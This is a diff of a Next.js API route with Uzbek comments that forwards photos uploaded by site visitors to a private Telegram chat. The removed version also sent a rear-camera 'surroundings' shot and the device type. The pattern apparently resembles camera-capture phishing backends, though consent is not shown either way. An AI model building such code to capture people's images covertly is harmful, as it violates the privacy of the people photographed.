@@ -1,7 +1,6 @@
 // pages/api/sendimg.js
 import formidable from "formidable";
 import fs from "fs";
-import fetch from "node-fetch"; // npm install node-fetch@2
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -18,71 +17,47 @@ export default async function handler(req, res) {
   }
 
   if (!BOT_TOKEN || !CHAT_ID) {
-    console.error("ENV o'zgaruvchilari yo'q");
-    return res.status(500).json({ error: "Server konfiguratsiyasi xatosi" });
+    return res.status(500).json({ error: "Token yoki chat ID yo'q" });
   }
 
-  const form = formidable({ multiples: true });
+  const form = formidable({});
 
   try {
     const [fields, files] = await form.parse(req);
 
-    const selfieFile = files.selfie?.[0];
-    const environmentFile = files.environment?.[0];
-    const device = fields.device?.[0] || "noma'lum";
+    const photoFile = files.photo?.[0];
 
-    if (!selfieFile) {
-      return res.status(400).json({ error: "Selfie topilmadi" });
+    if (!photoFile) {
+      return res.status(400).json({ error: "Rasm topilmadi" });
     }
 
-    const time = new Date().toLocaleString("uz-UZ");
+    // Faylni buffer ga o'qiymiz
+    const buffer = fs.readFileSync(photoFile.filepath);
 
-    // Bitta rasm yuborish funksiyasi
-    const sendPhoto = async (filePath, caption = "") => {
-      // Faylni Buffer ga o'qiymiz
-      const buffer = fs.readFileSync(filePath);
+    // Blob yaratamiz
+    const blob = new Blob([buffer], { type: "image/jpeg" });
 
-      // Buffer dan Blob yaratamiz
-      const blob = new Blob([buffer], { type: "image/jpeg" });
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "selfie.jpg");
+    formData.append("caption", `Saytdan yangi selfie! 📸\nVaqt: ${new Date().toLocaleString("uz-UZ")}`);
 
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
-      if (caption) formData.append("caption", caption);
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData,
+    });
 
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData,
-      });
+    const result = await response.json();
 
-      const result = await response.json();
-
-      if (!result.ok) {
-        console.error("Telegram xatosi:", result);
-        throw new Error(result.description || "Yuborishda xatolik");
-      }
-
-      console.log("Yuborildi:", caption || "Selfie");
-    };
-
-    // Selfie yuboramiz
-    let mainCaption = `Saytdan rasm! 📸\nVaqt: ${time}\nQurilma: ${device === "mobile" ? "Telefon" : "Kompyuter"}`;
-
-    if (environmentFile) {
-      mainCaption += "\nQuyida atrofdagi surat ham bor";
+    if (result.ok) {
+      return res.status(200).json({ success: true });
+    } else {
+      console.error("Telegram xatosi:", result);
+      return res.status(500).json({ error: result.description || "Yuborishda xatolik" });
     }
-
-    await sendPhoto(selfieFile.filepath, mainCaption);
-
-    // Agar telefon bo'lsa — orqa kameradan ham yuboramiz (teng emas, ketma-ket)
-    if (environmentFile) {
-      await sendPhoto(environmentFile.filepath, "Atrof 🌍");
-    }
-
-    return res.status(200).json({ success: true });
 
   } catch (error) {
     console.error("Server xatosi:", error);
-    return res.status(500).json({ error: "Server xatosi: " + error.message });
+    return res.status(500).json({ error: "Server xatosi" });
   }
 }
